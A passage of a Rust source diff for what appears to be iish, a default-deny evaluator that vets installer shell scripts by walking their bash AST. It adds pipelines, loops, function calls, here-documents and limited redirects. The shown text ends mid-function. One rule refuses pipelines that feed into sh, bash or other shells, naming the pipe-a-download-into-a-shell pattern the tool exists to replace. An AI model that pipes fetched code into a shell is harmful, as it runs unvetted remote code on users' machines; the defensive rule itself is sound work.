@@ -5,22 +5,39 @@
 //! Default deny. The evaluator walks brush-parser's real bash AST
 //! (`parser::ast`) and only allows the specific shapes it recognizes as
 //! safe installer operations; every construct it does not yet implement
-//! — pipelines, control flow, functions, redirection, expansions, and
-//! so on — is denied here. This is the "if we didn't understand it, we
-//! don't run it" posture the old hand-rolled parser used to enforce by
-//! refusing to tokenize; now that parsing covers the full grammar, the
-//! evaluator enforces it instead.
+//! — pipelines, some redirections, some expansions, and so on — is
+//! denied here. This is the "if we didn't understand it, we don't run
+//! it" posture the old hand-rolled parser used to enforce by refusing
+//! to tokenize; now that parsing covers the full grammar, the evaluator
+//! enforces it instead.
 
 use crate::config::{Config, NetworkPolicy, Verb};
-use crate::exec::{Action, FetchOutput, Mode};
-use crate::parser::{ast, case_pattern_word, literal_word};
-use crate::state::{self, Session};
+use crate::exec::{Action, FetchOutput, LookupStyle, Mode, StderrDest, StdoutDest};
+use crate::parser::{ast, case_pattern_word, glob_match, literal_word, word_fields, ExpandCtx};
+use crate::state;
 use std::fs;
 use std::path::{Path, PathBuf};
 
-/// Not `PartialEq`/`Eq`: `Group` carries `brush_parser::ast` nodes,
-/// which only derive those outside of brush-parser's own test build.
-/// Nothing here ever compares two `Verdict`s, so this costs nothing.
+/// A control-flow builtin (`return`/`exit`/`break`/`continue`): not an
+/// [`Action`] — it doesn't *do* anything — but a signal the runner
+/// unwinds to the right boundary (the enclosing function call, loop, or
+/// the whole run).
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum Flow {
+    /// `return [n]`: end the innermost function call with status `n`.
+    Return(i32),
+    /// `exit [n]`: end the whole run with status `n`.
+    Exit(u8),
+    /// `break [n]`: leave `n` levels of enclosing loop.
+    Break(u32),
+    /// `continue [n]`: next iteration of the `n`th enclosing loop.
+    Continue(u32),
+}
+
+/// Not `PartialEq`/`Eq`: several variants carry `brush_parser::ast`
+/// nodes, which only derive those outside of brush-parser's own test
+/// build. Nothing here ever compares two `Verdict`s, so this costs
+/// nothing.
 #[derive(Debug, Clone)]
 pub enum Verdict {
     /// Safe to execute; `action` is the compiled operation.
@@ -30,14 +47,23 @@ pub enum Verdict {
     Prompt { reason: String, action: Action },
     /// Refused.
     Deny { reason: String },
-    /// A brace group, or a call to a function defined earlier in the
-    /// run: not a single compiled `Action`, but a nested statement list
-    /// that the runner must evaluate and execute one statement at a
-    /// time against the *same* live session — exactly like top-level
-    /// statements — because a later statement's verdict can depend on
-    /// ledger changes an earlier one in the same group made.
+    /// A brace group or a matched `case` arm: not a single compiled
+    /// `Action`, but a nested statement list that the runner must
+    /// evaluate and execute one statement at a time against the *same*
+    /// live session — exactly like top-level statements — because a
+    /// later statement's verdict can depend on ledger changes an
+    /// earlier one in the same group made.
     Group {
         statements: Vec<ast::CompoundListItem>,
+    },
+    /// A call to a function defined earlier in the run: like `Group`,
+    /// but the runner brackets the body in a call frame so `args`
+    /// become the body's `$1`/`$@`/`$#`, `local` declarations scope to
+    /// the call, and `return` unwinds to exactly here.
+    Call {
+        name: String,
+        args: Vec<String>,
+        body: Vec<ast::CompoundListItem>,
     },
     /// `if`/`elif`/`else`/`fi`: unlike `Group`, which branch (if any)
     /// runs depends on the actual exit status of `condition` — which may
@@ -52,6 +78,25 @@ pub enum Verdict {
         then_branch: Vec<ast::CompoundListItem>,
         elses: Option<Vec<ast::ElseClause>>,
     },
+    /// `for NAME in words...; do ...; done`. The word list is kept
+    /// unexpanded: the runner expands it (`word_fields`, so `"$@"` and
+    /// field splitting behave) at the moment the loop starts, then runs
+    /// `body` once per resulting field with NAME assigned. `values` of
+    /// `None` is the `for NAME; do` shorthand for iterating `"$@"`.
+    For {
+        variable: String,
+        values: Option<Vec<ast::Word>>,
+        body: Vec<ast::CompoundListItem>,
+    },
+    /// `while`/`until cond; do ...; done`: the runner alternates
+    /// `condition` (exempt from abort-on-failure, like `if`'s) and
+    /// `body` until the condition says stop — inverted for `until` —
+    /// with an iteration ceiling turning a runaway loop into a refusal.
+    While {
+        condition: Vec<ast::CompoundListItem>,
+        body: Vec<ast::CompoundListItem>,
+        until: bool,
+    },
     /// `first && second || third ...`: like `If`'s condition, whether
     /// `second`/`third`/... even run depends on the real exit status of
     /// what came before, so this can't be resolved to a fixed action
@@ -64,6 +109,22 @@ pub enum Verdict {
         first: ast::Pipeline,
         rest: Vec<ast::AndOr>,
     },
+    /// `! pipeline`: run the (bang-stripped) pipeline for its status
+    /// and report the logical negation. Never aborts the run on its own
+    /// — bash exempts `!`-prefixed pipelines from `errexit` entirely.
+    Not { pipeline: Box<ast::Pipeline> },
+    /// `first | second | ...`: a real multi-stage pipeline. The runner
+    /// evaluates each stage against the live session at its turn (so a
+    /// stage is vetted by exactly the policy it would face standing
+    /// alone) and runs them *sequentially*, buffering each stage's
+    /// captured stdout as the next stage's stdin — installers pipe
+    /// small probe output (`uname -s | tr ...`, `echo $path | grep
+    /// ...`), not unbounded streams, and buffering keeps every stage's
+    /// policy decision strictly ordered. The pipeline's status is the
+    /// last stage's, as in bash without `pipefail`.
+    Pipe { stages: Vec<ast::Command> },
+    /// `return`/`exit`/`break`/`continue`.
+    ControlFlow(Flow),
 }
 
 fn allow(reason: impl Into<String>, action: Action) -> Verdict {
@@ -110,29 +171,34 @@ pub fn items(program: &ast::Program) -> Vec<ast::CompoundListItem> {
 }
 
 /// Evaluate one top-level statement against the policy, the current
-/// session ledger, and the effective configuration.
+/// session (through `ctx`, which also carries the command-substitution
+/// callback expansion may need), and the effective configuration.
 pub fn evaluate_item(
     item: &ast::CompoundListItem,
-    session: &Session,
+    ctx: &mut ExpandCtx,
     config: &Config,
 ) -> Statement {
     Statement {
         raw: item.0.to_string(),
-        verdict: evaluate_list_item(item, session, config),
+        verdict: evaluate_list_item(item, ctx, config),
     }
 }
 
-fn evaluate_list_item(item: &ast::CompoundListItem, session: &Session, config: &Config) -> Verdict {
+fn evaluate_list_item(
+    item: &ast::CompoundListItem,
+    ctx: &mut ExpandCtx,
+    config: &Config,
+) -> Verdict {
     let ast::CompoundListItem(and_or, separator) = item;
     if matches!(separator, ast::SeparatorOperator::Async) {
         return deny("background jobs (`&`) are not implemented yet");
     }
-    evaluate_and_or_list(and_or, session, config)
+    evaluate_and_or_list(and_or, ctx, config)
 }
 
-fn evaluate_and_or_list(list: &ast::AndOrList, session: &Session, config: &Config) -> Verdict {
+fn evaluate_and_or_list(list: &ast::AndOrList, ctx: &mut ExpandCtx, config: &Config) -> Verdict {
     if list.additional.is_empty() {
-        evaluate_pipeline(&list.first, session, config)
+        evaluate_pipeline(&list.first, ctx, config)
     } else {
         Verdict::AndOrList {
             first: list.first.clone(),
@@ -148,32 +214,54 @@ fn evaluate_and_or_list(list: &ast::AndOrList, session: &Session, config: &Confi
 /// pipeline may depend on ledger changes an earlier one made).
 pub fn evaluate_pipeline_item(
     pipeline: &ast::Pipeline,
-    session: &Session,
+    ctx: &mut ExpandCtx,
     config: &Config,
 ) -> Statement {
     Statement {
         raw: pipeline.to_string(),
-        verdict: evaluate_pipeline(pipeline, session, config),
+        verdict: evaluate_pipeline(pipeline, ctx, config),
     }
 }
 
-fn evaluate_pipeline(pipeline: &ast::Pipeline, session: &Session, config: &Config) -> Verdict {
+fn evaluate_pipeline(pipeline: &ast::Pipeline, ctx: &mut ExpandCtx, config: &Config) -> Verdict {
     if pipeline.timed.is_some() {
         return deny("`time` is not implemented yet");
     }
     if pipeline.bang {
-        return deny("`!` pipeline negation is not implemented yet");
+        // Hand the runner the same pipeline minus its `!` so it can run
+        // it for a status and negate; the negation itself never aborts.
+        let mut inner = pipeline.clone();
+        inner.bang = false;
+        return Verdict::Not {
+            pipeline: Box::new(inner),
+        };
     }
     match pipeline.seq.as_slice() {
         [] => deny("empty pipeline"),
-        [only] => evaluate_command(only, session, config),
+        [only] => evaluate_command(only, ctx, config),
         stages => {
             if stages.iter().any(is_shell_invocation) {
                 deny("piping into a shell is exactly what iish exists to replace; refusing")
             } else {
-                deny("pipelines are not implemented yet")
+                Verdict::Pipe {
+                    stages: stages.to_vec(),
+                }
             }
         }
+    }
+}
+
+/// Evaluate one stage of a multi-stage pipeline at the moment the
+/// runner reaches it — the `Verdict::Pipe` counterpart to
+/// [`evaluate_pipeline_item`].
+pub fn evaluate_pipe_stage(
+    stage: &ast::Command,
+    ctx: &mut ExpandCtx,
+    config: &Config,
+) -> Statement {
+    Statement {
+        raw: stage.to_string(),
+        verdict: evaluate_command(stage, ctx, config),
     }
 }
 
@@ -193,10 +281,10 @@ fn is_shell_name(name: &str) -> bool {
     matches!(name, "sh" | "bash" | "zsh" | "dash" | "ksh")
 }
 
-fn evaluate_command(cmd: &ast::Command, session: &Session, config: &Config) -> Verdict {
+fn evaluate_command(cmd: &ast::Command, ctx: &mut ExpandCtx, config: &Config) -> Verdict {
     match cmd {
-        ast::Command::Simple(sc) => evaluate_simple_command(sc, session, config),
-        ast::Command::Function(def) => evaluate_function_definition(def, session),
+        ast::Command::Simple(sc) => evaluate_simple_command(sc, ctx, config),
+        ast::Command::Function(def) => evaluate_function_definition(def, ctx),
         ast::Command::ExtendedTest(_, redirects) => {
             if redirects.is_some() {
                 return deny("redirection is not implemented yet");
@@ -204,8 +292,24 @@ fn evaluate_command(cmd: &ast::Command, session: &Session, config: &Config) -> V
             deny("`[[ ]]` extended test is not implemented yet")
         }
         ast::Command::Compound(compound, redirects) => {
-            if redirects.is_some() {
-                return deny("redirection is not implemented yet");
+            // Discard-shaped redirects on a compound command (atuin's
+            // `{ true < /dev/tty; } 2> /dev/null` interactivity probe,
+            // `if ...; fi > /dev/null`, ...) are accepted and ignored:
+            // iish's native actions don't write the script's output to
+            // stderr, and suppressing a subprocess's chatter inside is
+            // cosmetic. Anything that would *redirect to a real file*
+            // stays denied.
+            if let Some(redirect_list) = redirects {
+                if !redirect_list
+                    .0
+                    .iter()
+                    .all(|r| is_ignorable_compound_redirect(r, ctx))
+                {
+                    return deny(
+                        "redirection on a compound command is only implemented for \
+                         discard shapes (`> /dev/null`, `2> /dev/null`, `2>&1`)",
+                    );
+                }
             }
             match compound {
                 // `{ ...; }`: not a policy-gated operation in itself —
@@ -216,9 +320,22 @@ fn evaluate_command(cmd: &ast::Command, session: &Session, config: &Config) -> V
                     statements: group.list.0.clone(),
                 },
                 ast::CompoundCommand::IfClause(if_clause) => evaluate_if(if_clause),
-                ast::CompoundCommand::CaseClause(case_clause) => {
-                    evaluate_case(case_clause, session)
-                }
+                ast::CompoundCommand::CaseClause(case_clause) => evaluate_case(case_clause, ctx),
+                ast::CompoundCommand::ForClause(for_clause) => Verdict::For {
+                    variable: for_clause.variable_name.clone(),
+                    values: for_clause.values.clone(),
+                    body: for_clause.body.list.0.clone(),
+                },
+                ast::CompoundCommand::WhileClause(clause) => Verdict::While {
+                    condition: clause.0 .0.clone(),
+                    body: clause.1.list.0.clone(),
+                    until: false,
+                },
+                ast::CompoundCommand::UntilClause(clause) => Verdict::While {
+                    condition: clause.0 .0.clone(),
+                    body: clause.1.list.0.clone(),
+                    until: true,
+                },
                 other => deny(format!("{} are not implemented yet", compound_kind(other))),
             }
         }
@@ -230,8 +347,8 @@ fn evaluate_command(cmd: &ast::Command, session: &Session, config: &Config) -> V
 /// plain brace-group body with no redirects is supported; a subshell
 /// body (`name() ( ... )`) or one with its own redirects would need
 /// machinery (subshell isolation, redirect handling) iish doesn't have.
-fn evaluate_function_definition(def: &ast::FunctionDefinition, session: &Session) -> Verdict {
-    let name = match literal_word(&def.fname, session.variables()) {
+fn evaluate_function_definition(def: &ast::FunctionDefinition, ctx: &mut ExpandCtx) -> Verdict {
+    let name = match literal_word(&def.fname, ctx) {
         Ok(n) => n,
         Err(reason) => return deny(reason),
     };
@@ -269,15 +386,16 @@ fn evaluate_if(if_clause: &ast::IfClauseCommand) -> Verdict {
 }
 
 /// `case value in pat1) ...;; pat2|pat3) ...;; esac`: unlike `if`,
-/// matching a `case` value against its patterns has no side effects, so
-/// (like `mkdir`'s "does this path exist?" check) it can be resolved
-/// right here: render `value` as a literal word, walk the arms in order,
+/// matching a `case` value against its patterns has no side effects
+/// beyond what the value/pattern words' own expansions do, so (like
+/// `mkdir`'s "does this path exist?" check) it can be resolved right
+/// here: render `value` as a literal word, walk the arms in order,
 /// and once one matches, hand its body back as an ordinary `Verdict::Group`
 /// — the runner doesn't need to know it came from a `case` at all. No
 /// arm matching falls through to a no-op, matching real `case`'s exit
 /// status of 0 when nothing matches.
-fn evaluate_case(case: &ast::CaseClauseCommand, session: &Session) -> Verdict {
-    let value = match literal_word(&case.value, session.variables()) {
+fn evaluate_case(case: &ast::CaseClauseCommand, ctx: &mut ExpandCtx) -> Verdict {
+    let value = match literal_word(&case.value, ctx) {
         Ok(v) => v,
         Err(reason) => return deny(reason),
     };
@@ -296,7 +414,7 @@ fn evaluate_case(case: &ast::CaseClauseCommand, session: &Session) -> Verdict {
     }
     for item in &case.cases {
         for pattern_word in &item.patterns {
-            let pattern = match case_pattern_word(pattern_word) {
+            let pattern = match case_pattern_word(pattern_word, ctx) {
                 Ok(p) => p,
                 Err(reason) => return deny(reason),
             };
@@ -307,29 +425,6 @@ fn evaluate_case(case: &ast::CaseClauseCommand, session: &Session) -> Verdict {
         }
     }
     allow("no case pattern matched; case is a no-op", Action::Noop)
-}
-
-/// Minimal glob matching for `case` patterns: `*` matches any run of
-/// characters (including none), `?` matches exactly one, `\x` matches
-/// the literal character `x` (how policy.rs represents a pattern
-/// character that came from quoted or escaped source text, so it isn't
-/// treated as a wildcard even though it looks like one), and any other
-/// character matches itself. No bracket-expression (`[...]`) support:
-/// installers' case patterns in practice only ever reach for `*`/`?`
-/// (`Linux*`, `x86_64`, a bare `*` default, ...).
-fn glob_match(pattern: &str, text: &str) -> bool {
-    fn matches(p: &[char], t: &[char]) -> bool {
-        match p.first() {
-            None => t.is_empty(),
-            Some('*') => (0..=t.len()).any(|i| matches(&p[1..], &t[i..])),
-            Some('?') => !t.is_empty() && matches(&p[1..], &t[1..]),
-            Some('\\') if p.len() > 1 => !t.is_empty() && p[1] == t[0] && matches(&p[2..], &t[1..]),
-            Some(c) => !t.is_empty() && *c == t[0] && matches(&p[1..], &t[1..]),
-        }
-    }
-    let pattern_chars: Vec<char> = pattern.chars().collect();
-    let text_chars: Vec<char> = text.chars().collect();
-    matches(&pattern_chars, &text_chars)
 }
 
 fn compound_kind(compound: &ast::CompoundCommand) -> &'static str {
@@ -348,42 +443,29 @@ fn compound_kind(compound: &ast::CompoundCommand) -> &'static str {
 }
 
 /// `VAR=value [VAR2=value2 ...]` with no command word: assigns one or
-/// more shell variables tracked for the rest of this run (parser.rs's
-/// `literal_word` reads them back for a later `$VAR` expansion) and
-/// nothing else — no filesystem or process side effects, so always
-/// allowed once every value renders as a literal word. Each value is
-/// rendered against the session as it stood *before* this statement, so
-/// (unlike real bash) a later assignment on the same line can't yet see
-/// an earlier one's freshly-set value — a rare enough shape in practice
+/// more shell variables tracked for the rest of this run (parser.rs
+/// reads them back for a later `$VAR`/`${VAR}` expansion) and nothing
+/// else — no filesystem or process side effects, so always allowed once
+/// every value renders as a literal word. Each value is rendered
+/// against the session as it stood *before* this statement, so (unlike
+/// real bash) a later assignment on the same line can't yet see an
+/// earlier one's freshly-set value — a rare enough shape in practice
 /// that it isn't worth the added complexity here. `VAR+=value`
 /// (appending), array-element (`VAR[i]=value`), and array-valued
 /// (`VAR=(a b c)`) assignments aren't implemented.
 fn evaluate_bare_assignment(
     items: &[ast::CommandPrefixOrSuffixItem],
-    session: &Session,
+    ctx: &mut ExpandCtx,
 ) -> Verdict {
     let mut assignments = Vec::with_capacity(items.len());
     for item in items {
         let ast::CommandPrefixOrSuffixItem::AssignmentWord(assignment, _) = item else {
             return deny("bare variable assignment is not implemented yet");
         };
-        if assignment.append {
-            return deny("`VAR+=value` (appending to an existing variable) is not implemented yet");
-        }
-        let name = match &assignment.name {
-            ast::AssignmentName::VariableName(name) => name.clone(),
-            ast::AssignmentName::ArrayElementName(..) => {
-                return deny("array element assignment (`VAR[i]=value`) is not implemented yet")
-            }
-        };
-        let ast::AssignmentValue::Scalar(word) = &assignment.value else {
-            return deny("array-valued assignment (`VAR=(a b c)`) is not implemented yet");
-        };
-        let value = match literal_word(word, session.variables()) {
-            Ok(v) => v,
+        match assignment_name_and_value(assignment, ctx) {
+            Ok(pair) => assignments.push(pair),
             Err(reason) => return deny(reason),
-        };
-        assignments.push((name, value));
+        }
     }
     allow(
         "assigns only literal values to shell variables tracked for this run; no filesystem \
@@ -392,9 +474,53 @@ fn evaluate_bare_assignment(
     )
 }
 
+/// The `(name, rendered value)` of one `NAME=value` assignment word,
+/// shared by bare assignment and `local`.
+fn assignment_name_and_value(
+    assignment: &ast::Assignment,
+    ctx: &mut ExpandCtx,
+) -> Result<(String, String), String> {
+    if assignment.append {
+        return Err(
+            "`VAR+=value` (appending to an existing variable) is not implemented yet".into(),
+        );
+    }
+    let name = match &assignment.name {
+        ast::AssignmentName::VariableName(name) => name.clone(),
+        ast::AssignmentName::ArrayElementName(..) => {
+            return Err("array element assignment (`VAR[i]=value`) is not implemented yet".into())
+        }
+    };
+    let ast::AssignmentValue::Scalar(word) = &assignment.value else {
+        return Err("array-valued assignment (`VAR=(a b c)`) is not implemented yet".into());
+    };
+    let value = literal_word(word, ctx)?;
+    Ok((name, value))
+}
+
+/// The redirects a statement carried that iish understands beyond the
+/// `>>` env-file append: where stdout and stderr should go, and an
+/// optional `< /dev/tty`/`< /dev/null` stdin probe (see
+/// `evaluate_argv`).
+#[derive(Debug, Clone, Default)]
+struct Redirects {
+    stdout: StdoutDest,
+    stderr: StderrDest,
+    stdin_probe: Option<String>,
+}
+
+/// True if `r` is a redirect a compound command may carry and have
+/// ignored (see `evaluate_command`): any of the recognized
+/// stdout/stderr discard shapes, but not `>>` (a real write).
+fn is_ignorable_compound_redirect(r: &ast::IoRedirect, ctx: &mut ExpandCtx) -> bool {
+    let mut scratch = Redirects::default();
+    let mut append: Option<&ast::Word> = None;
+    note_redirect(r, &mut append, &mut scratch, ctx) && append.is_none()
+}
+
 fn evaluate_simple_command(
     cmd: &ast::SimpleCommand,
-    session: &Session,
+    ctx: &mut ExpandCtx,
     config: &Config,
 ) -> Verdict {
     if cmd.word_or_name.is_none() {
@@ -403,7 +529,7 @@ fn evaluate_simple_command(
         // guaranteed non-empty by the grammar whenever there's no
         // command word.
         let items = cmd.prefix.as_ref().map(|p| p.0.as_slice()).unwrap_or(&[]);
-        return evaluate_bare_assignment(items, session);
+        return evaluate_bare_assignment(items, ctx);
     }
     if let Some(prefix) = &cmd.prefix {
         if !prefix.0.is_empty() {
@@ -411,54 +537,62 @@ fn evaluate_simple_command(
         }
     }
 
+    // The command word is field-expanded too: `"$@"` (or a
+    // whitespace-separated `$CMD`) as the command position — rustup's
+    // `ensure mktemp -d` runs `"$@"` — yields the command name *and*
+    // its leading arguments.
     let name_word = cmd.word_or_name.as_ref().unwrap();
-    let name = match literal_word(name_word, session.variables()) {
-        Ok(n) => n,
+    let mut name_fields = match word_fields(name_word, ctx) {
+        Ok(fields) => fields.into_iter(),
         Err(reason) => return deny(reason),
     };
+    let Some(name) = name_fields.next() else {
+        return deny("the command word expanded to nothing");
+    };
 
-    let mut args: Vec<String> = Vec::new();
-    // The only redirect shapes iish understands at all: a single `>>`
-    // onto a plain filename, and a single `2> /dev/null` (discarding
-    // stderr writes nothing anywhere, so there is no path or content to
-    // vet). Anything else (other fds, `<`, `>`, `2>` onto a real file,
-    // heredocs, process substitution as a redirect target, repeats of
-    // either supported shape, ...) is denied below.
+    let mut args: Vec<String> = name_fields.collect();
+    // The redirect shapes iish understands: a single `>>` onto a plain
+    // filename (the env-file append grammar), `> /dev/null` and
+    // `2> /dev/null` (discarding writes nothing anywhere, so there is
+    // no path or content to vet), `2>&1` (stderr follows stdout), and
+    // `>&2` (stdout joins iish's own stderr). Anything else (other fds,
+    // `<`, `>`/`2>` onto a real file, heredocs, process substitution as
+    // a redirect target, ...) is denied below.
     let mut append_target: Option<&ast::Word> = None;
-    let mut discard_stderr = false;
+    let mut heredoc: Option<&ast::IoHereDocument> = None;
+    let mut redirects = Redirects::default();
     let mut unsupported_redirect = false;
     if let Some(suffix) = &cmd.suffix {
         for item in &suffix.0 {
             match item {
-                ast::CommandPrefixOrSuffixItem::Word(w) => {
-                    match literal_word(w, session.variables()) {
-                        Ok(s) => args.push(s),
-                        Err(reason) => return deny(reason),
-                    }
-                }
-                ast::CommandPrefixOrSuffixItem::AssignmentWord(..) => {
-                    return deny("assignment arguments are not implemented yet");
-                }
-                ast::CommandPrefixOrSuffixItem::IoRedirect(r) => match r {
-                    ast::IoRedirect::File(
-                        None,
-                        ast::IoFileRedirectKind::Append,
-                        ast::IoFileRedirectTarget::Filename(target),
-                    ) if append_target.is_none() => {
-                        append_target = Some(target);
-                    }
-                    ast::IoRedirect::File(
-                        Some(2),
-                        ast::IoFileRedirectKind::Write,
-                        ast::IoFileRedirectTarget::Filename(target),
-                    ) if !discard_stderr
-                        && literal_word(target, session.variables()).ok().as_deref()
-                            == Some("/dev/null") =>
-                    {
-                        discard_stderr = true;
-                    }
-                    _ => unsupported_redirect = true,
+                ast::CommandPrefixOrSuffixItem::Word(w) => match word_fields(w, ctx) {
+                    Ok(fields) => args.extend(fields),
+                    Err(reason) => return deny(reason),
                 },
+                ast::CommandPrefixOrSuffixItem::AssignmentWord(assignment, _) => {
+                    // Only `local` takes assignment-shaped arguments
+                    // meaningfully; hand it the rendered `NAME=value`
+                    // text and let `evaluate_local` take it apart.
+                    if name == "local" {
+                        match assignment_name_and_value(assignment, ctx) {
+                            Ok((n, v)) => args.push(format!("{n}={v}")),
+                            Err(reason) => return deny(reason),
+                        }
+                    } else {
+                        return deny("assignment arguments are not implemented yet");
+                    }
+                }
+                ast::CommandPrefixOrSuffixItem::IoRedirect(ast::IoRedirect::HereDocument(
+                    None | Some(0),
+                    doc,
+                )) if heredoc.is_none() => {
+                    heredoc = Some(doc);
+                }
+                ast::CommandPrefixOrSuffixItem::IoRedirect(r) => {
+                    if !note_redirect(r, &mut append_target, &mut redirects, ctx) {
+                        unsupported_redirect = true;
+                    }
+                }
                 ast::CommandPrefixOrSuffixItem::ProcessSubstitution(..) => {
                     return deny("process substitution is not implemented yet");
                 }
@@ -469,14 +603,28 @@ fn evaluate_simple_command(
     if unsupported_redirect {
         return deny(
             "redirection is only implemented for a single `>>` onto a plain filename \
-             (see the env-file append grammar) and `2> /dev/null`",
+             (see the env-file append grammar), `> /dev/null`, `2> /dev/null`, `2>&1`, \
+             and `>&2`",
         );
     }
 
+    if let Some(doc) = heredoc {
+        // The one here-document idiom installers actually use: `cat <<
+        // EOF` printing a banner/usage block. `cat` copying its stdin
+        // to stdout *is* printing the body, so it compiles to the same
+        // native Print as `echo` — no subprocess, no prompt.
+        if name != "cat" || !args.is_empty() || append_target.is_some() {
+            return deny(
+                "here-documents are only implemented for a bare `cat << EOF` printing a banner",
+            );
+        }
+        return evaluate_cat_heredoc(doc, redirects.stdout);
+    }
+
     match append_target {
-        None => evaluate_argv(&name, &args, discard_stderr, session, config),
+        None => evaluate_argv(&name, &args, redirects, ctx, config, false),
         Some(target) if matches!(name.as_str(), "echo" | "printf") => {
-            evaluate_env_file_append(&name, &args, target, session, config)
+            evaluate_env_file_append(&name, &args, target, ctx, config)
         }
         Some(_) => deny(format!(
             "redirecting `{name}`'s output is not implemented yet"
@@ -484,76 +632,453 @@ fn evaluate_simple_command(
     }
 }
 
-/// `discard_stderr` is a `2> /dev/null` on the command. Only the
-/// subprocess tier consults it (the child's stderr goes to the null
-/// device); every native implementation writes the script's output to
-/// stdout only — anything on iish's own stderr is iish diagnosing the
-/// run, not the command's output — so for them it is already true.
+/// `cat << EOF ... EOF`: print the body. A `<<-` strips leading tabs,
+/// as in a real shell. A body that would need expansion (`$VAR` or a
+/// backquote under an unquoted delimiter) is refused rather than
+/// printed wrong — installers' banners are plain text.
+fn evaluate_cat_heredoc(doc: &ast::IoHereDocument, dest: StdoutDest) -> Verdict {
+    let mut text = doc.doc.value.clone();
+    if doc.remove_tabs {
+        text = text
+            .split_inclusive('\n')
+            .map(|line| line.trim_start_matches('\t'))
+            .collect();
+    }
+    if doc.requires_expansion && text.contains(['$', '`']) {
+        return deny("a here-document containing expansions is not implemented yet");
+    }
+    allow(
+        "prints the here-document body only",
+        Action::Print { text, dest },
+    )
+}
+
+/// Record one redirect into `append_target`/`redirects` if it's a shape
+/// iish understands (returning false for anything else). Repeats of the
+/// same slot are unsupported too — a second `>>`, two stdout
+/// redirections, ... — with one exception: bash processes redirects
+/// left to right, but iish's model only tracks final destinations, so
+/// order-sensitive combinations beyond the ubiquitous
+/// `> /dev/null 2>&1` aren't distinguished.
+fn note_redirect<'a>(
+    r: &'a ast::IoRedirect,
+    append_target: &mut Option<&'a ast::Word>,
+    redirects: &mut Redirects,
+    ctx: &mut ExpandCtx,
+) -> bool {
+    use ast::{IoFileRedirectKind as Kind, IoFileRedirectTarget as Target, IoRedirect};
+    let target_is_dev_null = |target: &ast::Word, ctx: &mut ExpandCtx| {
+        literal_word(target, ctx).ok().as_deref() == Some("/dev/null")
+    };
+    match r {
+        IoRedirect::File(None, Kind::Append, Target::Filename(target))
+            if append_target.is_none() =>
+        {
+            *append_target = Some(target);
+            true
+        }
+        IoRedirect::File(None | Some(1), Kind::Write, Target::Filename(target))
+            if redirects.stdout == StdoutDest::Inherit && target_is_dev_null(target, ctx) =>
+        {
+            redirects.stdout = StdoutDest::Null;
+            true
+        }
+        IoRedirect::File(Some(2), Kind::Write, Target::Filename(target))
+            if redirects.stderr == StderrDest::Inherit && target_is_dev_null(target, ctx) =>
+        {
+            redirects.stderr = StderrDest::Null;
+            true
+        }
+        IoRedirect::File(Some(2), Kind::DuplicateOutput, target)
+            if redirects.stderr == StderrDest::Inherit && duplicates_fd(target, 1) =>
+        {
+            redirects.stderr = StderrDest::Stdout;
+            true
+        }
+        IoRedirect::File(None | Some(1), Kind::DuplicateOutput, target)
+            if redirects.stdout == StdoutDest::Inherit && duplicates_fd(target, 2) =>
+        {
+            redirects.stdout = StdoutDest::Stderr;
+            true
+        }
+        IoRedirect::File(None | Some(0), Kind::Read, Target::Filename(target))
+            if redirects.stdin_probe.is_none() =>
+        {
+            match literal_word(target, ctx).ok().as_deref() {
+                Some(path @ ("/dev/null" | "/dev/tty")) => {
+                    redirects.stdin_probe = Some(path.to_string());
+                    true
+                }
+                _ => false,
+            }
+        }
+        _ => false,
+    }
+}
+
+/// Does this `>&` target name file descriptor `fd`? brush encodes
+/// `2>&1` as either an `Fd` target or (in word form) a `Duplicate`
+/// word, depending on how it was written.
+fn duplicates_fd(target: &ast::IoFileRedirectTarget, fd: i32) -> bool {
+    match target {
+        ast::IoFileRedirectTarget::Fd(n) => *n == fd,
+        ast::IoFileRedirectTarget::Duplicate(word) => word.value == fd.to_string(),
+        _ => false,
+    }
+}
+
 fn evaluate_argv(
     name: &str,
     args: &[String],
-    discard_stderr: bool,
-    session: &Session,
+    redirects: Redirects,
+    ctx: &mut ExpandCtx,
     config: &Config,
+    skip_functions: bool,
 ) -> Verdict {
     // A function defined earlier in the run shadows everything below,
     // exactly as it would in bash (function lookup happens before
-    // builtins or a $PATH search). The call's own arguments are not
-    // bound to `$1`/`$@` inside the body — positional-parameter
-    // expansion isn't implemented — so a body that actually needs them
-    // will simply deny at that specific statement, same as any other
-    // script that references an unsupported expansion. (A redirect on
-    // the call, e.g. `has_local 2> /dev/null`, applies to nothing here:
-    // the body's own statements are vetted and run individually.)
-    if let Some(body) = session.lookup_function(name) {
-        return Verdict::Group {
-            statements: body.0.clone(),
-        };
+    // builtins or a $PATH search) — unless this dispatch came through
+    // `command NAME`, whose entire point is to skip that shadowing.
+    // (A redirect on the call itself, e.g. `has_local 2> /dev/null`,
+    // applies to nothing here: the body's own statements are vetted
+    // and run individually.)
+    if !skip_functions {
+        if let Some(body) = ctx.session.lookup_function(name) {
+            return Verdict::Call {
+                name: name.to_string(),
+                args: args.to_vec(),
+                body: body.0.clone(),
+            };
+        }
     }
 
     if config.command_override(name) == Some(Verb::Deny) {
         return deny(format!("`{name}` is denied by configuration"));
     }
 
+    // `< /dev/tty` exists in installers as exactly one idiom: `true <
+    // /dev/tty`, probing whether a controlling terminal can be opened
+    // (atuin's interactivity check). That probe is implemented; feeding
+    // the terminal to anything else is not. `< /dev/null` reads
+    // nothing, so elsewhere it's satisfied by doing nothing.
+    if let Some(path) = &redirects.stdin_probe {
+        if matches!(name, "true" | ":") {
+            return allow(
+                format!("succeeds only if `{path}` can be opened for reading; reads nothing"),
+                Action::ProbeRead {
+                    path: PathBuf::from(path),
+                },
+            );
+        }
+        if path == "/dev/tty" && name != "read" {
+            return deny(
+                "`< /dev/tty` is only implemented for `true` (the interactivity probe) and \
+                 `read` (a y/n question)",
+            );
+        }
+    }
+
+    // Native implementations ignore a stdout/stderr redirect they have
+    // no output for (discarding nothing is a no-op — same treatment
+    // `2> /dev/null` has had since it landed); the ones that do print
+    // (`echo`/`printf`, `command -v`/`type`, the subprocess tier)
+    // honor it.
     match name {
         "true" | ":" => allow("does nothing", Action::Noop),
-        "echo" => evaluate_echo(args),
-        "printf" => evaluate_printf(args),
+        "false" => allow(
+            "does nothing, unsuccessfully",
+            Action::Test { result: false },
+        ),
+        "echo" => evaluate_echo(args, redirects.stdout),
+        "printf" => evaluate_printf(args, redirects.stdout),
         "mkdir" => evaluate_mkdir(args),
-        "rm" => evaluate_rm(args, session),
-        "chmod" => evaluate_chmod(args, session),
-        "cp" => evaluate_cp(args, session, config),
-        "curl" => evaluate_curl(args, session, config),
